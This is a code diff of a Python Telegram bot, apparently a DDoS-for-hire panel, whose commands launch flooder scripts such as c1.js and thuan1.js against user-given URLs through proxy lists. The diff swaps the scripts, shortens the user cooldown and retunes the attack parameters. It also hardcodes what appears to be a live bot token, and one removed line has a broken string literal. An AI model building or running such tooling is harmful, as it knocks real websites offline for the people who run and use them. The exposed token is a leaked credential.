@@ -7,13 +7,13 @@ import html
 
 import concurrent.futures
 
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # ========== CAU HINH ==========
 TOKEN = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw'
 ADMIN_IDS = [7818408538]  # ID Admin
-USER_COOLDOWN = 5 * 60  # 5 phut
+USER_COOLDOWN = 5 *12  # 5 phut
 MAX_USER_DURATION = 120  # Gioi han thanh vien
 
 last_user_attack_time = {}
@@ -96,9 +96,9 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         update_last_attack(user_id)
 
-    script = os.path.join(os.getcwd(), 'kill.js')
+    script = os.path.join(os.getcwd(), 'c1.js')
     # attack them —cache
-    await start_attack(script, url, duration, '100, '4', 'proxy.txt', user_id, context, chat_id, ['--cache'])
+    await start_attack(script, url, duration, '30', '5', '7.txt', user_id, context, chat_id, ['--cache'])
 
 async def clf(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -130,7 +130,7 @@ async def clf(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         update_last_attack(user_id)
 
-    script = os.path.join(os.getcwd(), 'c.js')
+    script = os.path.join(os.getcwd(), 'thuan1.js')
     # clf KHONG them —cache
     await start_attack(script, url, duration, '21', '7', '1', user_id, context, chat_id)
 
@@ -164,9 +164,9 @@ async def attackkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         update_last_attack(user_id)
 
-    script = os.path.join(os.getcwd(), 'tls1.js')
+    script = os.path.join(os.getcwd(), 'c1.js')
     # attackkill them —cache
-    await start_attack(script, url, duration, '100, '4', 'proxy.txt', user_id, context, chat_id, ['--cache'])
+    await start_attack(script, url, duration, '30', '4', 'proxy.txt', user_id, context, chat_id, ['--cache'])
 
 async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
